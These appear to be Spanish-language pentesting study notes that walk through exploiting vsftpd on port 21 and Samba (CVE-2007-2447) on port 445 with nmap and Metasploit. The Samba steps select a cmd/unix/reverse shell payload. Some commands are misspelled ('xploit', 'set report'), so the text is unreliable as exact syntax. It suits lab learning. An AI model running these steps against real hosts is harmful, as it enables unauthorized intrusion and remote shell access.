# Vulnerabilidades

aqui veremos algunas vulnerabilidades de algunos sistemas

### Listas 

- FTP en linux
- SMB en linux

# FTP en linux

lo primeros que haremos es escanear los puertos con nmap y vemos los puertos que estan abiertos esta abierto el 21,
despues usaremos el search vsftp para comprobar el servicio en funcionamiento

y nos apareceran las opciones que podemos usar, en mi caso utilizare la segunda opcion, por lo tanto escribo use 1

y nos responde que no hay payloads y escribimos options ahora utilizaremos el modulo rhost escribiendo set RHOST [ip del objetivo]
podemos utilizar options para ver que podemos hacer a continuacion usaremos el comando xploit
y entrara en el FTP

# SMB en linux
voveremos a analizar los puertos y viendo que tenemos el puerto 445 abierto vamos atacarlo (el servicio de SMB)

podemos hacer un escaneo en profundidad con "nmap -sV -p 445 [ip Objetivo]" sabiendo esto vamos a iniciar la mfsconsola

ejecutaremos un auxilar de smb con el comando "use auxiliary/scanner/smb/smb_version"
ahora utilizamos el comando set hosts [ip objetivo]

y usaramos search para buscar el codigo de la vulnerabilidad "search cve:2007-2447"
escribimos el exploit que nosindica en los modulos
ponemos "show options"
ahora con "set rhost [ip objetivo]"
y "set report 445"
y "show options"
y "show payloads" para ver los payloads y usaremos el cmd/unix/reverse
y ya tenemos todo preparado para ejecutar el exploit
